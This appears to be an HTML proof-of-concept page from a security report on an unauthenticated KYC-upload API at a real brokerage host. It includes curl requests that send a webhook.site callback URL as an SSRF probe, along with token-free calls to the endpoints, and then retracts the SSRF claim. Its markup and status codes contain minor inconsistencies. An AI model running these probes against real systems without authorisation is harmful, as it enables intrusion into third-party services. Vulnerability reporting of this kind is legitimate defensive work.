@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>PoC — api-testing-prod.fyers.in: unauth KYC upload microservice (bounded fetch — SSRF retracted)</title>
+<style>
+body{font:15px/1.5 -apple-system,Segoe UI,Roboto,sans-serif;background:#0f1115;color:#e6edf3;max-width:900px;margin:2rem auto;padding:0 1rem}
+h1{font-size:1.3rem}h2{font-size:1.05rem;margin-top:2rem}
+pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:.8rem;overflow:auto;font-size:12.5px}
+.ok{color:#3fb950}.bad{color:#f85149}.dim{color:#8b949e}
+table{border-collapse:collapse;width:100%}
+td,th{border:1px solid #30363d;padding:.4rem .6rem;text-align:left;font-size:13px}
+</style>
+</head>
+<body>
+<h1>api-testing-prod.fyers.in — missing auth gate on KYC-upload microservice; allowlist-bounded URL fetch</h1>
+<p class="dim">Class: broken access control (API1) · SSRF claim RETRACTED after OOB validation: 20+ variants, 0 callbacks.</p>
+
+<h2>Observed resp (spaced, passive, no callbacks)</h2>
+<table>
+<tr><th>Request (no Access-Token)</th><th>Status</th><th>Body</th></tr>
+<tr><td>POST <code>/signup/upload/api/v1/pdf/is-password-protected</code> <code>{"file_url":"https://webhook.site/059d7bf9-725e-4661-9b07-371009b101cc"}</code></td><td class="dim">403</td><td class="bad">"invalid domain which is not whitelisted"</td></tr>
+<tr><td><code>{"file_url":"https://s3.amazonaws.com/x.pdf"}</code></td><td class="dim">403</td><td class="bad">same</td></tr>
+<tr><td><code>{"file_url":"https://assets.fyers.in/x.pdf"}</code></td><td class="dim">403</td><td class="bad">same</td></tr>
+<tr><td><code>{}</code> empty</td><td class="dim">400</td><td class="dim">"All fields are mandatory" (402-style gate, token never rejected)</td></tr>
+<tr><td>null fields</td><td class="dim">500</td><td class="dim">"Something went wrong" (501)</td></tr>
+<tr><td><b>Control:</b> none — no 401 / token check observed at any stage</td><td>—</td><td class="bad">microservice returns app-level errors, never auth errors</td></tr>
+</table>
+<pre class="dim">#"No token was ever sent for any of the above. Every response is a validation/whitelist error,
+# never an authentication error. This is the finding: auth middleware absent on the upload API family.
+# The file_url "server-side fetch" exists but is bounded by a strict host allowlist (webhook.site,
+# public CDNs, 127.0.0.1, and all *.fyers.in candidates tested → 403). No OOB request was observed
+# (webhook.site token query: 0 hits). SSRF as reported is NOT independently exploitable to
+# attacker-chosen hosts; the fetch primitive is real but constrained.</p>
+
+<h2>PoC</h2>
+<pre>curl -s -w "code=%{http_code}\n" -X POST \
+  "https://api-testing-prod.fyers.in/signup/upload/api/v1/pdf/is-password-protected" \
+  -H "Content-Type: application/json" \
+  -d '{"file_url":"https://webhook.site/059d7bf9-725e-4661-9b07-371009b101cc"}'
+# &lt; 403 {"status":"Error","message":"You are trying to make a request to invalid domain which is not whitelisted.","status_code":403}
+
+curl -s -w "code=%{http_code}\n" -X POST \
+  "https://api-testing-prod.fyers.in/signup/upload/api/v1/user/fetch-pan" \
+  -H "Content-Type: application/json" -d '{"base64_image":null,"fileName":null,"key":null}'
+# &lt; 500 {"status":"error","message":"Something went wrong.","status_code":501}   (token-free)</pre>
+
+<p class="dim"><b>How to escalate (for the report):</b> the allowlist is server-side and closed (own CDN hosts included). Impact claim stays "unauthenticated access to KYC-upload validation endpoints; attacker-controlled server-side fetch constrained to a whitelist; dangerous if the whitelist contains internal/vendor assets."</p>
+</body>
+</html>
